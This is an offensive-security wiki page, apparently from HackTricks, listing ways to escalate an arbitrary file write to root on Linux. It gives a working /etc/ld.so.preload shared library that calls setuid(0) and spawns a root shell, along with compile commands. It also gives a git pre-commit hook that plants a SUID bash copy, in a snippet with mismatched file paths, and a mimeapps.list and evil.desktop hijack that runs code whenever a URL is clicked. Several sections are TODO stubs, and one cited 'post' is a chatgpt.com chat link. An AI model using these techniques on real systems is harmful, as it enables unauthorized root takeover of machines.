# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.

For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```

### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

An attacker with write permissions to a victim's configuration directories can easily replace or create files that change system behavior, resulting in unintended code execution. By modifying the `$HOME/.config/mimeapps.list` file to point HTTP and HTTPS URL handlers to a malicious file (e.g., setting `x-scheme-handler/http=evil.desktop`), the attacker ensures that **clicking any http or https link triggers code specified in that `evil.desktop` file**. For example, after placing the following malicious code in `evil.desktop` in `$HOME/.local/share/applications`, any external URL click runs the embedded command:

```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```

For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

{{#include ../../banners/hacktricks-training.md}}



